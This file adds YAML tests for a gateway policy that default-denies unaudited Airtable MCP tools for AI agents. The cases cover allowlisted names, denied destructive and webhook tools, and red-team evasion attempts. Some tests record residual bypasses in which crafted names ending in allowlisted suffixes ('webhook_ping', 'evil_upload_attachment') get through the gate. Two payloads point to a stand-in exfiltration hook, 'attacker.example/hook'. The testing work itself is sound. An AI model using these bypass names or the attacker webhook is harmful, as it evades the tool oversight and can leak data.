@@ -1,0 +1,529 @@
+# Tests for airtable/default-deny-unknown-tools.
+# Covers every branch of the allowlist gate:
+#   - allow: official verbose names (bare + gateway-prefixed), domdomegg terse
+#     names, page reads, writes, upload_attachment, case-insensitive match;
+#   - deny (fail closed): community destructive delete_records (endswith
+#     non-collision), display_records_for_table widget (endswith non-collision),
+#     structure/exposure tools, unverified rashidazarang webhook tool,
+#     missing/empty name, non-string name, non-ASCII homoglyph, newline splice,
+#     whitespace padding, deliberately-excluded official page-discovery tool;
+#   - documented residuals: prefix glued directly to an allowlisted suffix, and
+#     the short "ping" suffix matching any un-audited name ending in "ping".
+
+- description: Official verbose read (gateway-prefixed airtable-list_records_for_table) ends with an allowlisted suffix and is allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-list_records_for_table
+      uri: null
+    payload:
+      name: airtable-list_records_for_table
+      args:
+        baseId: appABC
+        tableId: tbl123
+  output:
+    expectedResult: allow
+
+- description: Official discovery tool ping (gateway-prefixed) is allowlisted and allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-ping
+      uri: null
+    payload:
+      name: airtable-ping
+      args: {}
+  output:
+    expectedResult: allow
+
+- description: domdomegg terse read (bare list_records) is a separate allowlist entry and is allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: list_records
+      uri: null
+    payload:
+      name: list_records
+      args:
+        baseId: appABC
+        tableId: tbl123
+  output:
+    expectedResult: allow
+
+- description: Official page read (get_record_for_page) is allowlisted and allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-get_record_for_page
+      uri: null
+    payload:
+      name: airtable-get_record_for_page
+      args:
+        baseId: appABC
+        pageId: pag1
+        recordId: rec1
+  output:
+    expectedResult: allow
+
+- description: Official write (create_records_for_table) is allowlisted and allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-create_records_for_table
+      uri: null
+    payload:
+      name: airtable-create_records_for_table
+      args:
+        baseId: appABC
+        tableId: tbl123
+        records: []
+  output:
+    expectedResult: allow
+
+- description: Official upload_attachment (added May 2026) is on the verified allowlist and allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-upload_attachment
+      uri: null
+    payload:
+      name: airtable-upload_attachment
+      args:
+        baseId: appABC
+        recordId: rec1
+  output:
+    expectedResult: allow
+
+- description: domdomegg create_comment is allowlisted and allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: create_comment
+      uri: null
+    payload:
+      name: create_comment
+      args:
+        baseId: appABC
+        recordId: rec1
+  output:
+    expectedResult: allow
+
+- description: Matching is case-insensitive (LIST_BASES) — an allowlisted suffix in uppercase is allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: LIST_BASES
+      uri: null
+    payload:
+      name: LIST_BASES
+      args: {}
+  output:
+    expectedResult: allow
+
+- description: >-
+    Community destructive delete_records (the biggest capability delta vs. the
+    official server) ends in "e_records", NOT the allowlisted update_records /
+    search_records / list_records suffixes, so it is denied by default with the
+    drift reason. Locks the critical endswith non-collision.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-delete_records
+      uri: null
+    payload:
+      name: airtable-delete_records
+      args:
+        baseId: appABC
+        tableId: tbl123
+        recordIds:
+          - rec1
+  output:
+    expectedResult: deny
+    expectedReason: "This Airtable tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. Default-deny is mandatory for Airtable because the rashidazarang community server advertises ~42 unverified tools — including webhook-management tools that open a persistent outbound data channel surviving the MCP session — and because upstream servers add tools over time (e.g. the May-2026 upload_attachment), so a new or renamed tool must fail closed until it is reviewed. Ask a gateway admin to introspect the tool live and, if it is safe for agents, add its verified name suffix to the per-tenant allowlist."
+
+- description: >-
+    Interactive widget display_records_for_table (off by default on the official
+    server) does NOT end with the allowlisted list_records_for_table suffix and
+    is denied. Locks the endswith non-collision for the widget.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-display_records_for_table
+      uri: null
+    payload:
+      name: airtable-display_records_for_table
+      args:
+        baseId: appABC
+        tableId: tbl123
+  output:
+    expectedResult: deny
+
+- description: Structure tool create_base is not allowlisted and is denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-create_base
+      uri: null
+    payload:
+      name: airtable-create_base
+      args:
+        workspaceId: wsp1
+  output:
+    expectedResult: deny
+
+- description: External-exposure tool publish_interface is not allowlisted and is denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-publish_interface
+      uri: null
+    payload:
+      name: airtable-publish_interface
+      args: {}
+  output:
+    expectedResult: deny
+
+- description: >-
+    Unverified rashidazarang webhook-management tool (create_webhook) is not on
+    the allowlist and is denied by default — the persistent-outbound-channel risk
+    stays closed until introspected and audited.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-create_webhook
+      uri: null
+    payload:
+      name: airtable-create_webhook
+      args:
+        baseId: appABC
+        notificationUrl: https://attacker.example/hook
+  output:
+    expectedResult: deny
+
+- description: >-
+    Deliberately-excluded official page-discovery tool list_pages_for_base does
+    NOT end with the allowlisted list_tables_for_base suffix and is denied until
+    audited. Locks a claimed non-collision.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-list_pages_for_base
+      uri: null
+    payload:
+      name: airtable-list_pages_for_base
+      args:
+        baseId: appABC
+  output:
+    expectedResult: deny
+
+- description: Empty tool name matches nothing and is denied (fail closed).
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: ""
+      uri: null
+    payload:
+      name: ""
+      args: {}
+  output:
+    expectedResult: deny
+
+- description: Non-string tool name (number) is coerced to "" instead of raising a lower() type error — clean, reasoned deny (fail closed).
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: 12345
+      uri: null
+    payload:
+      name: 12345
+      args: {}
+  output:
+    expectedResult: deny
+
+- description: >-
+    Homoglyph of an allowlisted suffix (Cyrillic "ѕearch_records") fails the raw
+    ASCII guard before lower() runs and is denied — closes the Unicode case-fold
+    / spoof evasion.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: "ѕearch_records"
+      uri: null
+    payload:
+      name: "ѕearch_records"
+      args: {}
+  output:
+    expectedResult: deny
+
+- description: >-
+    Red-team regression — an embedded newline splicing a denied tool onto an
+    allowlisted suffix ("delete_records\nlist_records") is denied. The raw ASCII
+    guard regex (^[A-Za-z0-9._-]+$) is NOT multiline in OPA/Go, so $ anchors to
+    end-of-text and the newline breaks the whole-string match before endswith
+    ever sees "list_records". Locks the non-multiline anchoring assumption.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: "delete_records\nlist_records"
+      uri: null
+    payload:
+      name: "delete_records\nlist_records"
+      args: {}
+  output:
+    expectedResult: deny
+
+- description: >-
+    Red-team regression — leading/trailing whitespace padding around an
+    allowlisted suffix ("  ping ") fails the raw ASCII character-class guard
+    (space is outside [A-Za-z0-9._-]) and is denied. Locks the guard's strictness
+    against whitespace-smuggled names.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: "  ping "
+      uri: null
+    payload:
+      name: "  ping "
+      args: {}
+  output:
+    expectedResult: deny
+
+- description: >-
+    Documented endswith residual — a prefix glued directly to an allowlisted
+    suffix (xget_record) still matches and is allowed. Recorded in Known
+    limitations; use full gateway tool names if stricter matching is required.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: xget_record
+      uri: null
+    payload:
+      name: xget_record
+      args:
+        baseId: appABC
+        recordId: rec1
+  output:
+    expectedResult: allow
+
+- description: >-
+    Red-team regression — the official destructive tool delete_page (interface
+    pages) is deliberately excluded and does not end with any allowlisted suffix
+    (no bare "page" / "delete_page" entry), so it is denied by default. Locks the
+    only verified official destructive tool as fail-closed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-delete_page
+      uri: null
+    payload:
+      name: airtable-delete_page
+      args:
+        pageId: pag1
+  output:
+    expectedResult: deny
+
+- description: >-
+    Red-team regression — request with no resource object at all. object.get
+    resolves resource to {} and name to "", which matches nothing and is denied
+    (fail closed). Locks the missing-resource path, distinct from an empty-string
+    name.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    payload:
+      args: {}
+  output:
+    expectedResult: deny
+
+- description: >-
+    Red-team regression — an object-typed tool name ({}) is not a string, so it
+    is coerced to "" and fails the is_string ASCII guard rather than being handed
+    to lower(); denied cleanly. Complements the number-typed non-string case.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: {}
+      uri: null
+    payload:
+      name: {}
+      args: {}
+  output:
+    expectedResult: deny
+
+- description: >-
+    Red-team regression — an allowlisted suffix with a TRAILING newline
+    ("list_records\n") is denied. In OPA/Go RE2 the $ anchor matches end-of-text
+    only (not before a final newline), so the raw ASCII guard ^[A-Za-z0-9._-]+$
+    rejects the trailing \n before endswith runs. Locks the end-anchor from the
+    trailing-newline direction (the existing newline case is a mid-string splice).
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: "list_records\n"
+      uri: null
+    payload:
+      name: "list_records\n"
+      args: {}
+  output:
+    expectedResult: deny
+
+- description: >-
+    Red-team finding (documented residual) — the 4-char "ping" suffix matches
+    ANY un-audited tool name that ends in "ping". An unverified community tool
+    named "bulk_dumping" ends in "ping" and is therefore ALLOWED, despite the
+    policy's "all unaudited tools are denied" framing. This is the one realistic
+    way the rashidazarang surface can reach an agent; documented under Known
+    limitations, resolved by pinning exact full gateway tool names (airtable-ping).
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bulk_dumping
+      uri: null
+    payload:
+      name: bulk_dumping
+      args: {}
+  output:
+    expectedResult: allow
+
+- description: >-
+    Red-team finding (documented residual) — second instance of the "ping"
+    short-suffix collision: an un-audited "record_scraping" tool ends in "ping"
+    and is allowed. Locks the collision as known behavior so it cannot regress
+    silently; the fix (if stricter matching is needed) is exact full tool names.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: record_scraping
+      uri: null
+    payload:
+      name: record_scraping
+      args: {}
+  output:
+    expectedResult: allow
+
+- description: >-
+    Red-team finding (documented residual) — the "ping" short-suffix collision
+    lands squarely on the policy's HEADLINE webhook risk. create_webhook is
+    denied (see the webhook test above), but a webhook tool whose name ends in
+    "ping" — and "ping"/test is a standard webhook event name — is ALLOWED via
+    the ping suffix. "webhook_ping" ends in "ping" and passes the gate, so the
+    "webhook tools stay closed until audited" claim carries the ping caveat.
+    Locked so the webhook×ping intersection cannot regress silently; the fix, as
+    for the other residuals, is exact full-tool-name matching. Documented under
+    Known limitations.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: webhook_ping
+      uri: null
+    payload:
+      name: webhook_ping
+      args:
+        baseId: appABC
+        notificationUrl: https://attacker.example/hook
+  output:
+    expectedResult: allow
+
+- description: >-
+    Red-team finding (documented residual) — the endswith glue residual is NOT
+    limited to the short "ping" suffix and is NOT closed by lengthening entries.
+    A crafted / compromised-server tool name glued directly onto a LONG
+    allowlisted WRITE suffix ("evil_upload_attachment" ends with
+    "upload_attachment") still matches and is ALLOWED. This proves the residual
+    generalizes to every suffix against an adversarial name, so the real fix is
+    exact-equality matching on the full gateway tool name — not longer endswith
+    entries. Documented under Known limitations.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: evil_upload_attachment
+      uri: null
+    payload:
+      name: evil_upload_attachment
+      args:
+        baseId: appABC
+        recordId: rec1
+  output:
+    expectedResult: allow
